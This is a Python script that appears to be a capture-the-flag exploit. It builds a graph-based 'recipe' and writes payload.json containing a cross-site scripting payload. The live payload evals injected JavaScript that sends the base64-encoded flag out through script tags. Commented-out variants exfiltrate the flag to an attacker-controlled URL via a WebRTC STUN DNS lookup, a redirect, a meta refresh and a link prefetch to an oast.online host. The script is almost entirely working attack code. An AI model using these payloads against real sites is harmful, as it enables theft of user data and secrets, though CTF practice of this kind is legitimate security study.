#!/usr/bin/python3
import sys
import json

reflect_url = sys.argv[1]

with open('graph.json', 'r') as f:
    graph = json.load(f)

nodes = [i[0] for i in graph['nodes']]
edges = graph['edges']
start = [i[0] for i in graph['start']]
end = [i[0] for i in graph['end']]

def gen_recipe():
    recipes = {}

    for i in start:
        recipes[i] = {}

    for _ in range(len(nodes)):
        for e in edges:
            if (e[0] in recipes) and (e[1] in recipes):
                combined =  recipes[e[0]] | recipes[e[1]] | {tuple(e[:2]): None}
                if (not e[2] in recipes) or (len(recipes[e[2]]) > len(combined)):
                    recipes[e[2]] = combined

    return [list(i) for i in recipes['XSS'].keys()]

xss_kek = '''
function meow(flag){
    var s = document.createElement("script");
    s.setAttribute("src", "kek?flag=" + btoa(flag));
    document.body.appendChild(s);
}

for(let i = 0; i < 694201337; i++) meow(i.toString());
'''

recipe_arr = gen_recipe()
recipe_arr.append([{'xss_kek': xss_kek, 'length': 42}, 'kek'])
print(len(recipe_arr))

#xss_str = '''document.body.innerHTML += '<h1>Hello!</h1>'; console.log('hi');'''

#xss_str = f'document.location="http://{reflect_url}"'

#xss_str = f'(async()=>{{let p=new RTCPeerConnection({{iceServers:[{{urls: `stun:${{state.flag.split("").map(c => c.charCodeAt(0).toString(16).padStart(2, "0")).join("")}}.{reflect_url}`}}]}});p.createDataChannel("");p.setLocalDescription(await p.createOffer())}})()'

#xss_str = f'''
#var s = document.createElement("script");
#s.setAttribute("src", `kek?flag=${{btoa(state.flag)}}`);
#document.body.appendChild(s);
#'''

#xss_str = f'''
#const linkEl = document.createElement('link');
#linkEl.rel = 'prefetch';
#linkEl.href = "http://cnts6kvc0aqdje0eu1ngxdky5nur651za.oast.online";
#document.head.appendChild(linkEl);
#'''

#xss_str = f'''
#document.body.innerHTML+='<meta http-equiv="refresh" content="1; http://{reflect_url}">'
#'''

xss_str = 'eval(state.recipe.slice(-1)[0][0].xss_kek);'

print(len(xss_str))

recipe_json = {'recipe': recipe_arr, 'xss': xss_str}
print(recipe_json)

with open('payload.json', 'w') as f:
    json.dump(recipe_json, f)
